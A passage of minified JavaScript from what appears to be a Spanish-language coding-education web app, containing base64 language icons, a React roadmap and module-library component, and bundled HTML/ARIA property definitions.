9fG22+Mt9xX+y1200OzEfcI8CWSBlmKAiIjSl/vwqKDrO/hT+FdtIF5VPrfijYwwcF9954rSW9w9/oApHF5Qvs21gLG9YAoekqcCNFHjsQ36lsmjqkWMOUtGuMrhq0F/Nkz4pOf/wHbHn7m9zo93gAAAABJRU5ErkJggg==",python:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADF0lEQVR4nO2YPWgUQRTHZ2dzM5dYaCFBAiaFNkZRBMUuiI0fRdBCwSZFolj4kWCSmRMJhyksBJVgI2qhhYIpFEREczPZmUSDSBo/kIAERWMnETQmSDRPdm89g4TczCXrXnD/8Jpr9ve7eTM7bxFKkiRJEoTAQTy3GWcEd7i8i7l4hZkYx0x+x1xMYi4+YCaeOlxecrncgbJZjMomHWJjAMwlmJbDxUN00lsZNzpC2XtVmMkxG/hCMTkU+0q4rH9nSfBhuZncrlgFMJfN4b85hk6JesRztZjLFxat1B2vABNteRB57c9vsstcQF4sC4HCCrTLOrsVkGUiUGI5iUDMkk4oAJq0gaYwq6ZA02egyL6lKgBBKToDmh4q/ekZb63D5eXwTTuxkHYpSUAH9RVkus6a3e2UjZjJb4sNXYIAgKJn7ejzx+Gi/+NzCJw3EyCjVvwOFz1RwwfFxLFAQJHT8wr45VWtMhbATLyJXkB8Ru2PqvMrQG8XFVBkjxl9q7cCczETscCEfxFEPvyTZdXBRi0u0GomwHPbo2kX+RMz+d5h8irqkGt+Pw40vVUUPl9nzNonIw9atsII5rIJdfbVBJOZYQAQBkUvGML7J9E5MwEujpqfIuImOv6AmkIXWkalDoCiw8bw+RbiZgJMtBgegf0o61UEUI8ra0DTHtDkLWj6wwpMmwqkm4wE3E6x16SfEetbF8B7FVtAk0+RQOtZNZjaZLbGTK43EBjKw6M0aPIucnhFJ2EYpcwE9ve6xd7CDhdXAgFFGiOH10HdQTZxmJBGdxhFTvwD+Gm/Ta0EMBNHjASK3WEWA17RZmQdnls+3/eeiAWmQNPXoMh18407R1wmdmMmpksWULQMxkUuG/zz/u+5YOkIFMmCW0jFLPmfCZAxGCD1oNOrQdHnS09AkcLnR9Ckq0wEaIuFwEfwUhtgMF0Lmr4MBbrjFQhaYgF7wKOHYxUwnmfn3sBfrAb1yASGURVocsMOnoyCTjegcgqoiq3+2AeK6PCKPRHeZcZB0RFQ9D4okoWBym3Qi9y4eZMkSYLKI78AoHyHJoxG8T4AAAAASUVORK5CYII=",csharp:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFPklEQVR4nO2ZbUxbVRjHD2O+YEBFs5g4P8ygXzQmbjFmcyDiFtKEZcItFWUyGFt4WxaZY/IBRt0iKAwEglsCDpPFbQIKxJktzgV0Y+HeDliFDZAyXkpLobQU6AuF9raPOZfMQWnvLe0F+oF/8iQ35/be8/uf8zzn3JMitKEN+Z4+HC97SaAov3VI+7PtkPYKHTlS2hQqy9+CfF0iEPnvGSr5PklzhU6fboDFkai9TEfIi39644H4SeSLihguOvbpxEWTI7hjxE9cNH8gP5uNfEWhQwUCQlWl4gJ3DGKsajJ0qDB63cB39pe8FqWoaE+bql8R+OJIm26A/aPnZbv7z7y5ZuACWfmzAmV5/eHJGrun4I5xRFdrF4yU3QyXip9fPXIAv73y0jMJmksWvsDTHeKg9rI1cqS8UgziTbyyhw0WJH48Xj3D1nnGdAN8Y2iGa3O90GfVwLjNAPN2mokxm55pw/cKDM2cRuLUPxrfHyrM8Bo8XF4cGq2qHOACv2CSgNpmAHeFzVWZJMyzbO+OHasejxgsiFwxeOTIDy9EjVZQqRwFmqe/AUO0DjzVID0Jufo/WPvADFHKCuo9TWGQ2wZixiqHuaa52HgL9PY58FZG+zyUGVtY+wodK4OnBzL/ddtAiu4X1heWGluABhvwJSvY4Dvj7WX9RGuqIXA4C5DqS0CjWeC2ATZ4POUGHkbe2Uzk6W8wfSRN1cDL8hxAoycX4B+FtwZw0XmT81x6SGvhLUU++ClOLAXnywBebbiE6+KquRvyDU3w+cxvTOClE7exzZzEMgK7tOecg/NhAI8+11J5z6KE4zNXXaYfvie1jC55RkFPQ8JUDfipstnhvTWANykueK51fWEgGhkTJrsFxPo/IWAshxucDwN4F2VLG7aRXxxp0/XwjrIIXlF/vQQOy9k1bwbwp4Ar4fx2Bz5MVQab5V84hVt1A2z5jwuWDTxafQGCHq3nTsDZxJuBObvVZSeZLtInSediPV+PGTCzGHDMf3xQ2SMvgYCOBEA9hwEpfcCA2s0U2q86Dy9KjwCihI/jrghQX6rTmeASj0U84bKT3809+LAOId3Hl4I7RvsngB4eXZ8ZuMayjOpoIwR3JLLDL4rAzmR4V1Oxtgbw5wCb6icp2ETFcsLj3zTqJGAHO9SZOyFEXbg2GxneZfFJisvEc20JLuHxvQYdteQZC9BQaaJgy/jp1TWAo2zmb+CSxqqHPEUN7Lh/EgLbDkBQ22fMNW7D91ymoW0WsvXXwX81DCRP1sD2/lOw+W4ckIY+WC3d0feCX1scIFkaPwZSp36F8OFCCGg/8H8abJOmw4Rlhnd4rVUPIf8cfZxy9+IBDR7zzAA+Uu4bPQfB0mSnuRzecwrmWTa2lWreboWw7lzntdN5EJA8c2EPcVdbOzMauVaT3d05oLZM8zLyET1i9tVLEguoK7HZbQOoPeUJRApPI1JoYnvxq9J0aPWiJu7oe5mUZIXHDJjluuAptGK1irYiSliJKIJ21YEfFQtC2VnonVW6Dd4zqwBCVsQFbkckUYfIj7atHHyZkZgdiCL+4kqr7fez4CtlLTTNdDGGDLSZCXyN28SKWni76wT3bk0KSSQR7fIefJkRYi8iiQfufjJ4EDIkiRWhVRWuD4pIQRQxwR84oUOkMNuzPPdULfHBiCK+RZRwzmNwkrAwNXZbtI5/AJLE6wvFJrSv0MBNJBGu3T8znKJidiKSaHUDvAO1isKRTwqQH1OElHDISZ4rmdqpE/kjn1f7vmcQSeQiUjiwEEQu07ahDSGf039Ig9FRXwxQewAAAABJRU5ErkJggg==",java:"data:image/png;base64,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",kotlin:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAE7UlEQVR4nM3Ue1BUZRzG8RMZ05jWDDZM2sUuk0w1jk026Urj3UnLC0p7AnFxucriugjCWS7L7llY3EUuOpqhkBqlkpagpmaGHlAUxUtj/uHodF5LIw2MFAm5P802Vshtz+6+x/WZef//fuY35zAvbgb8CoHRnwBvrwX8VwNTc4CZVmCeBWB5QGUAIpOBpYlAwnIgRQvwMYA1EshXAx+r+n7bo85XdWZ7dSKbgSzPxpiY4cWAHIjicLG6w+bdLmu8fT7bANqITeobZ1qzhrZ02QYB2V7yxds3ZAdAE7FJXX+uJWvY3Q7r4+i0ekMGhJHpvse+BhwhpkhE5EXdvnAn89k77VlD0bHyCciAMDK9VgbQQKQva750yzyqodXig7aspyADwtg7/h7AXYQusfVKnWlMXUumL1otT0MGhLHv+G4AVxGhaW21V/l3a5vNz+FuxnBQR9iY9P7jewCcRczPbL8u8tOv/sW/jGbzSFBH2BzF9wGQipia03HzRz5AvGP0Q5PpVVBH2KTE9wNwiFjTebuaV19sTB+NRuProI6wSY0fANAfYtRGNB3MiDt/K20sbhvehAwIg/R4B4CeiGc+Q/OuLP0PDakK/Jn2DmRAGJyLlwDohmgryrbW/JE8EQ0p/qCNgHWQC/ESAUwZOix5BSfq9dNxM3kKZEAYXIuXAihFV8K67Ufrkt5HHfceaCPaLEPSXI93BChFl2bdnsobifPwe9Js0Ea0WHzcjHcAYAuEit8SWFxfEQjqiAxfCvEDAGYV1gi/xi9CbXwwqCP45ynF29dH/LgtlyquxoXj2vLFoI1oMr2UylBd2f3xr31+7RjRxXb9oosGbURjuh/lePu6xb+wrb76sja+44pWi5+XaUAZIUO8fffiR5Q0nLwcy7WLSxNAlsaBLuItmeLtKwOGlTSeu6DhW37SJEOMTQJNRD03kWPk3OB1Fy/sDeGaDi/U4UiIFkKIBhWLolGpikBlaBiOhobi2OIQVKmDcFzN4kRYIKrDA1AdMQcnIz7AqciZqImagdPR03A6ejLOLJmIszH+OBujQL5qp6BnyVemScIg2QBlCw2N5UGJKA+OB03EyrDSw3EhBCuCCTgl2Skb4tBHKfg+SA+aCHN4qRCtJohVEfyL0LPiDlkQ37EG0ESkRu8WVFEE4eEEPREcK35JHXFQaQItRKJmt6DUEAQvIegPoVeKJUolHqUG+FaZARoInXavMFtHEKAlcITgWHGLyQQvOoAPLXAXodHtE6atIJgZT/DAEQcCrXAHERa/X/DXE0xKInAWoVeSzW4j9i9YBVcRqsQDwlgDwbhUAlcRHEs2uYXYtyAXriBY7qDwBk8wxkjgLkLPkk9dRnwzfzWcRcxPPiS8kkXgl0lAC8EpSZFLiL0Ba+EMYpahXBiRTTDSSkAboWfFQobBI04B9gSsh1TEjPRywSefwDeX4KFB7Jm3AVIQk81HhMFrCZ5cQyA3gmPFjZIRu+cWwRFiQkaF4FVA4L2e4AEi1khClM3djIEQE8yVArOBwP4eNEKvFFc7BJTOKUZ/CIW56r/4hxaxa/YX6AuhMB/vFe8pBMeS/AEAW9EToeBP9BvvsUuwJG8AwP+I8fwph/Eeu4SS5A4A2IrxfI3keM9dQszpE6AwOh/vuW9CXHUfwJ14D/6dsv8BKIynKtyN9yCC/xuYy7jZ8QpbKwAAAABJRU5ErkJggg==",sql:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFTUlEQVR4nO2Ze0xTZxyG+Wd/mrbekIKgeOWiGM3c0HFujVu2aDJjVGhRNi+7uKnokJskJhqdUFoNICoTlJ7itoBuaFGB4kQiTlGgBZWOIZchIrTlYlQygXfphwJl7pK1FZL1TZ7knF+Tk/dpvu+ckxwXF2ecceb/FUlm1wRW1bWEVXdKOb4zllN1prF8RwGn6rzF8R1VrMpcx6rMrZzKbGZ5cx+rNvVxvMly3MrypjpOba7ieNMtVm0q4HhjGscbY1l1u1SSZQq0XNshpZnMbppVdR1j+U4Dx3dhiM4RdPwZtfkVmEZgHIRVGw0sbzzKqtsou5TnVN1ZHN89rLRjBbhB2sHybWqbBZamtGK0BAJTm2CzwIKYu3hzXx2WJLWATjc5XIDKaMXbyY0IOFADnzi9fQQsBLxgQdw9LNpXi8UH6/GWoglLkh8g6FgrqLR2UCfaQae3gzlpAnvKBJbvAKs2g800gsk0gs5oA5X+CNSJVrxzrAWByU1YfKgeC+NrsWC/Af577sA3Tk+wlHeIQEDMHQTEDjB/BPMI1Vb47x5JFfxG4PuSOAtOAes4BXaPskBAVPXoCey2g8CMjUWYH1n12gXmxFTCc/NV2wWmhpyHp1SDmZuvwGfbTcyL1DtMwCdGh1nhZfD6pARuoUVwk2ntIzCAhuARooHXunx4b7iMmZ+VYPaX1+ETXgafnbfhG1EO312V8IvSwT9aD/+YavjFVsMvRg/faB18IisxN6Icc766hdk7yjBj68+YvqUUnpuK4bG+CGJZIdwG0TpOwCMkbwiphQuDuEsvjuCSFWJp/jAKIJYNxylgX4Fp6/Ox8Iuf4B1WMPYEpkrzcPC7GjS1PcHz3n60dfTg08PlpLh3WD5OFjTiSU8vLPn9eR9ySh5g7kYtKT7jIy0aHj1F1uXm0RP4PKmclCu9a0R0ehWSfvgVW5IriEDu9RbyW5mhA/LsWly7YyLnV3TtRGDWBi05LyxvGz2Bw2drSQl5tsFqCbG7Ssjc0PwYXusGlo1naD5qfntM5lzUtbEh8G50yeASuVljRvD+G0Rg53E9mR05f99qEx/V1JP5lhTd2BDwCMkDE1GMc9db0NvXj/5+YHuqDttSdaRcSm6dlcCRc/fJfMfx6rEhMC30wuBdKDS+bHCNvxd7jRxXN3RhqmygvIfsEvT1XWQuiS4dGwLKnF+gKmxERJoevLaJFDpV0ED+9dK7A5u2WG/EHtU9ImZJ/u1HVpu4ofUpUs7VEz5WVrxega0pFXhoekaKPH72HLmlLfDdVEgEfDdrobnxkCyt4fnmYoPVbbRhGIozdY4RcF+d/Z8fZD6btFi64yoCtxfD8OIulH6pEe6yf/cgc12jsV1gPKeA24dZNr9KzN5QiMDwYgSGX4XX+sJ/FJi8MgciNsl2ARGTAAsTJIfhujwDbquy4T5cwk7vQm6yfExZ/SMmLechkqRASB8i2E1gADlhPJuIicuSMen9NExecQpTVp6G26ociNechXjteYiDNXAPzhsSCL4AcXAexGs1mLI6F66rzsB15feYtCILEz/IwPhlqRAxlsLKFxxyrMCrSXwlQlrxFyj/BqfAUJwCtFPAtojohMpRE6CUFTbWd3EZJzkwQcjEfyui43tfmwCl7BVQytPjJMn2++QkkHztLWLkUSImoUREJ/TYXYBS9AgoZYmAUkYKgpKmuzg0i46/IWATFwkZeZiIke8VMXJexMgvi+hEnZCWN4uYRLOQSex+KSCgFd1CWmEWUInNAlqhE9KKIgGl5AWUYq8wSBkmCFIutFzTsaWdccYZl7GYPwD3CezGzg02CgAAAABJRU5ErkJggg==",bash:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAABL0lEQVR4nO3YS0oDQQAE0HcA76CIX0SRgOAX3LgUvJ5eR68hKKhBY6KIbkRoGelFFETIxHR36ILaTUI9mEyHoabm3zKDMwwQCusAp9HwhQiF97SB9DMY0rZ9GYwYV6UeUCGmFVKTW8KUVOoBFaJCZF2pB1SICvGtR5jDZemQk3igzuK6ZMgbDocwV6VCAl5xEDGLuCsVEvCMrYhZRrdUSMATOhGzgcdSIQEPWIuYzQQvNYzri3oR0GQJNyVC7rEeESu4nTAijAPSHbqlVhM+ubT5cHMQLgz9LnqJEKENpDkA5yOik+hJFdpC3uNp3mQ7niU/r9kd8R3C3iQhH9jBMV5+uaYZNEr2J31r5VapB1SICpF1pR5QISpE1pV6QIWYVshFBiPa9nzEP6g1Nf7IJzFv5kkgE1ItAAAAAElFTkSuQmCC",graphql:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAABL0lEQVR4nO3YS0oDQQAE0HcA76CIX0SRgOAX3LgUvJ5eR68hKKhBY6KIbkRoGelFFETIxHR36ILaTUI9mEyHoabm3zKDMwwQCusAp9HwhQiF97SB9DMY0rZ9GYwYV6UeUCGmFVKTW8KUVOoBFaJCZF2pB1SICvGtR5jDZemQk3igzuK6ZMgbDocwV6VCAl5xEDGLuCsVEvCMrYhZRrdUSMATOhGzgcdSIQEPWIuYzQQvNYzri3oR0GQJNyVC7rEeESu4nTAijAPSHbqlVhM+ubT5cHMQLgz9LnqJEKENpDkA5yOik+hJFdpC3uNp3mQ7niU/r9kd8R3C3iQhH9jBMV5+uaYZNEr2J31r5VapB1SICpF1pR5QISpE1pV6QIWYVshFBiPa9nzEP6g1Nf7IJzFv5kkgE1ItAAAAAElFTkSuQmCC"},gP={html:Rn.html,css:Rn.css,js:Rn.js,"ts-module":Rn.ts,"react-module":Rn.react,node:Rn.node,python:Rn.python,java:Rn.java,csharp:Rn.csharp,kotlin:Rn.kotlin,sql:Rn.sql,bash:Rn.bash,graphql:Rn.graphql,wasm:Jf,xaml:xd,"c-lang":y0,regex:Dp,"data-formats":jp,security:Qr,"auth-security":_c,tailwind:kD,"prog-bases":y0,db:wp,testing:_D,"deploy-devops":h9,devops:ID,"cloud-computing":b9,networking:wD,"algo-structures":eH,"software-engineering":kH,"clean-code":pg,architecture:Zr,logic:XV,mathbasic:t9,nosql:F9,vibecoding:KV,"visual-architecture":DD,diccionario:ED,"git-version-control":PD,"linux-basics":N1,"docker-containers":xD,capacitor:Jn,default:_s},h7=()=>{const a=rr(),[e,t]=U.useState("career"),[n,i]=U.useState(""),{history:r}=Jc(),l=d=>gP[d]||gP.default,u=(d,p,f="")=>{const h=l(d);return typeof h=="string"?b.jsx("img",{src:h,alt:d,className:`mod-icon-img ${f}`,style:{width:p,height:p}}):Go.createElement(h,{size:p,className:`mod-icon-svg ${f}`})};return b.jsxs("div",{className:"roadmap-container new-structure",children:[r&&r.length>0&&b.jsxs("section",{className:"learning-history animate-fade-in",children:[b.jsx("div",{className:"history-header",children:b.jsxs("h3",{children:[b.jsx(pg,{className:"inline-icon",size:20})," Continuar Aprendiendo"]})}),b.jsx("div",{className:"history-scroll-container",children:b.jsx("div",{className:"history-track",children:r.slice(0,6).map((d,p)=>b.jsxs("div",{className:"history-card",onClick:()=>a(`/learn/${d.moduleId}?lesson=${d.lessonId}`),children:[b.jsx("div",{className:"history-card-icon",children:u(d.moduleId,24)}),b.jsxs("div",{className:"history-card-info",children:[b.jsx("h4",{children:d.lessonTitle}),b.jsx("span",{children:d.moduleTitle})]})]},`${d.lessonId}-${p}`))})})]}),b.jsxs("div",{className:"sticky-header",children:[b.jsxs("header",{className:"roadmap-main-header",children:[b.jsx("h1",{children:e==="career"?"Plan de Carrera Profesional":"Librera de Conocimiento"}),b.jsx("p",{className:"subtitle",children:e==="career"?"Sigue el camino estructurado para convertirte en Senior Engineer.":"Mdulos independientes para potenciar tu stack tecnolgico."})]}),b.jsxs("div",{className:"roadmap-tabs-row",children:[b.jsxs("div",{className:"roadmap-tabs",children:[b.jsxs("button",{className:`tab-btn ${e==="career"?"active":""}`,onClick:()=>t("career"),children:[b.jsx(wD,{size:18})," Roadmap Principal"]}),b.jsxs("button",{className:`tab-btn ${e==="library"?"active":""}`,onClick:()=>t("library"),children:[b.jsx(Zr,{size:18})," Biblioteca de Mdulos"]})]}),b.jsx("div",{className:"roadmap-search",children:b.jsxs("div",{className:"search-input-wrapper",children:[b.jsx(Dp,{size:18,className:"search-icon"}),b.jsx("input",{type:"text",placeholder:"Buscar mdulo, tecnologa o habilidad...",value:n,onChange:d=>i(d.target.value)}),n&&b.jsx("button",{className:"clear-search",onClick:()=>i(""),children:""})]})})]})]}),b.jsxs("div",{className:"roadmap-content-area",children:[e==="career"&&b.jsx("section",{className:"roadmap-section hierarchical animate-fade-in",children:b.jsxs("div",{className:"roadmap-timeline",children:[hP.levels.filter(d=>d.name.toLowerCase().includes(n.toLowerCase())||d.skills.some(p=>p.toLowerCase().includes(n.toLowerCase()))||d.modules.some(p=>Td(p)?.title.toLowerCase().includes(n.toLowerCase()))).map((d,p)=>b.jsxs("div",{className:"roadmap-level-card",children:[b.jsxs("div",{className:"level-header",children:[b.jsx("span",{className:"level-badge",children:d.name}),b.jsx("p",{className:"level-desc",children:d.description})]}),b.jsxs("div",{className:"level-body",children:[b.jsxs("div",{className:"skills-column",children:[b.jsx("h4",{children:"Habilidades Clave:"}),b.jsx("div",{className:"skills-tags",children:d.skills.map((f,h)=>b.jsx("span",{className:"skill-tag",children:f},h))})]}),b.jsxs("div",{className:"modules-column",children:[b.jsx("h4",{children:"Mdulos:"}),b.jsxs("div",{className:"modules-grid-mini",children:[d.modules.filter(f=>n?Td(f)?.title.toLowerCase().includes(n.toLowerCase()):!0).map(f=>{const h=Td(f);return h?b.jsxs("div",{className:"module-card-mini",onClick:()=>a(`/learn/${h.id}`),title:h.title,children:[b.jsx("div",{className:"mod-icon-wrapper-mini",children:u(h.id,28,"mini")}),b.jsx("span",{className:"mod-title",children:h.title})]},f):null}),d.modules.length===0&&b.jsx("span",{className:"coming-soon",children:"Prximamente..."})]})]})]})]},p)),hP.levels.filter(d=>d.name.toLowerCase().includes(n.toLowerCase())||d.skills.some(p=>p.toLowerCase().includes(n.toLowerCase()))||d.modules.some(p=>Td(p)?.title.toLowerCase().includes(n.toLowerCase()))).length===0&&b.jsxs("div",{className:"no-results",children:['No se encontraron niveles o mdulos que coincidan con "',n,'"']})]})}),e==="library"&&b.jsxs("section",{className:"roadmap-section independent animate-fade-in",children:[b.jsx("div",{className:"independent-modules-grid",children:C0.filter(d=>d.title.toLowerCase().includes(n.toLowerCase())||d.description?.toLowerCase().includes(n.toLowerCase())||d.track?.toLowerCase().includes(n.toLowerCase())).map(d=>b.jsxs("div",{className:"ind-module-card",onClick:()=>a(`/learn/${d.id}`),children:[b.jsxs("div",{className:"card-top",children:[b.jsx("div",{className:"icon-wrapper",children:u(d.id,40,"large")}),b.jsx("span",{className:"track-tag",children:d.track||"Tech"})]}),b.jsx("h3",{children:d.title}),b.jsx("p",{children:d.description})]},d.id))}),C0.filter(d=>d.title.toLowerCase().includes(n.toLowerCase())||d.description?.toLowerCase().includes(n.toLowerCase())||d.track?.toLowerCase().includes(n.toLowerCase())).length===0&&b.jsxs("div",{className:"no-results",children:['No se encontraron mdulos en la biblioteca para "',n,'"']})]})]})]})},Ad=({code:a,language:e})=>b.jsxs("div",{className:"code-block-container",children:[e&&b.jsx("div",{className:"code-block-header",children:e}),b.jsx("div",{className:"code-block-content",children:b.jsx("pre",{children:b.jsx("code",{children:a.trim()})})})]});function bP(a){const e=[],t=String(a||"");let n=t.indexOf(","),i=0,r=!1;for(;!r;){n===-1&&(n=t.length,r=!0);const l=t.slice(i,n).trim();(l||!r)&&e.push(l),i=n+1,n=t.indexOf(",",i)}return e}function OD(a,e){const t={};return(a[a.length-1]===""?[...a,""]:a).join((t.padRight?" ":"")+","+(t.padLeft===!1?"":" ")).trim()}const g7=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,b7=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,v7={};function vP(a,e){return(v7.jsx?b7:g7).test(a)}const y7=/[ \t\n\f\r]/g;function E7(a){return typeof a=="object"?a.type==="text"?yP(a.value):!1:yP(a)}function yP(a){return a.replace(y7,"")===""}class Mp{constructor(e,t,n){this.normal=t,this.property=e,n&&(this.space=n)}}Mp.prototype.normal={};Mp.prototype.property={};Mp.prototype.space=void 0;function UD(a,e){const t={},n={};for(const i of a)Object.assign(t,i.property),Object.assign(n,i.normal);return new Mp(t,n,e)}function lp(a){return a.toLowerCase()}class vn{constructor(e,t){this.attribute=t,this.property=e}}vn.prototype.attribute="";vn.prototype.booleanish=!1;vn.prototype.boolean=!1;vn.prototype.commaOrSpaceSeparated=!1;vn.prototype.commaSeparated=!1;vn.prototype.defined=!1;vn.prototype.mustUseProperty=!1;vn.prototype.number=!1;vn.prototype.overloadedBoolean=!1;vn.prototype.property="";vn.prototype.spaceSeparated=!1;vn.prototype.space=void 0;let S7=0;const ta=hl(),pt=hl(),T0=hl(),xe=hl(),_a=hl(),Lc=hl(),In=hl();function hl(){return 2**++S7}const x0=Object.freeze(Object.defineProperty({__proto__:null,boolean:ta,booleanish:pt,commaOrSpaceSeparated:In,commaSeparated:Lc,number:xe,overloadedBoolean:T0,spaceSeparated:_a},Symbol.toStringTag,{value:"Module"})),ty=Object.keys(x0);class q1 extends vn{constructor(e,t,n,i){let r=-1;if(super(e,t),EP(this,"space",i),typeof n=="number")for(;++r<ty.length;){const l=ty[r];EP(this,ty[r],(n&x0[l])===x0[l])}}}q1.prototype.defined=!0;function EP(a,e,t){t&&(a[e]=t)}function $c(a){const e={},t={};for(const[n,i]of Object.entries(a.properties)){const r=new q1(n,a.transform(a.attributes||{},n),i,a.space);a.mustUseProperty&&a.mustUseProperty.includes(n)&&(r.mustUseProperty=!0),e[n]=r,t[lp(n)]=n,t[lp(r.attribute)]=n}return new Mp(e,t,a.space)}const zD=$c({properties:{ariaActiveDescendant:null,ariaAtomic:pt,ariaAutoComplete:null,ariaBusy:pt,ariaChecked:pt,ariaColCount:xe,ariaColIndex:xe,ariaColSpan:xe,ariaControls:_a,ariaCurrent:null,ariaDescribedBy:_a,ariaDetails:null,ariaDisabled:pt,ariaDropEffect:_a,ariaErrorMessage:null,ariaExpanded:pt,ariaFlowTo:_a,ariaGrabbed:pt,ariaHasPopup:null,ariaHidden:pt,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:_a,ariaLevel:xe,ariaLive:null,ariaModal:pt,ariaMultiLine:pt,ariaMultiSelectable:pt,ariaOrientation:null,ariaOwns:_a,ariaPlaceholder:null,ariaPosInSet:xe,ariaPressed:pt,ariaReadOnly:pt,ariaRelevant:null,ariaRequired:pt,ariaRoleDescription:_a,ariaRowCount:xe,ariaRowIndex:xe,ariaRowSpan:xe,ariaSelected:pt,ariaSetSize:xe,ariaSort:null,ariaValueMax:xe,ariaValueMin:xe,ariaValueNow:xe,ariaValueText:null,role:null},transform(a,e){return e==="role"?e:"aria-"+e.slice(4).toLowerCase()}});function BD(a,e){return e in a?a[e]:e}function FD(a,e){return BD(a,e.toLowerCase())}const C7=$c({attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:Lc,acceptCharset:_a,accessKey:_a,action:null,allow:null,allowFullScreen:ta,allowPaymentRequest:ta,allowUserMedia:ta,alt:null,as:null,async:ta,autoCapitalize:null,autoComplete:_a,autoFocus:ta,autoPlay:ta,blocking:_a,capture:null,charSet:null,checked:ta,cite:null,className:_a,cols:xe,colSpan:null,content:null,contentEditable:pt,controls:ta,controlsList:_a,coords:xe|Lc,crossOrigin:null,data:null,dateTime:null,decoding:null,default:ta,defer:ta,dir:null,dirName:null,disabled:ta,download:T0,draggable:pt,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:ta,formTarget:null,headers:_a,height:xe,hidden:T0,high:xe,href:null,hrefLang:null,htmlFor:_a,httpEquiv:_a,id:null,imageSizes:null,imageSrcSet:null,inert:ta,inputMode:null,integrity:null,is:null,isMap:ta,itemId:null,itemProp:_a,itemRef:_a,itemScope:ta,itemType:_a,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:ta,low:xe,manifest:null,max:null,maxLength:xe,media:null,method:null,min:null,minLength:xe,multiple:ta,muted:ta,name:null,nonce:null,noModule:ta,no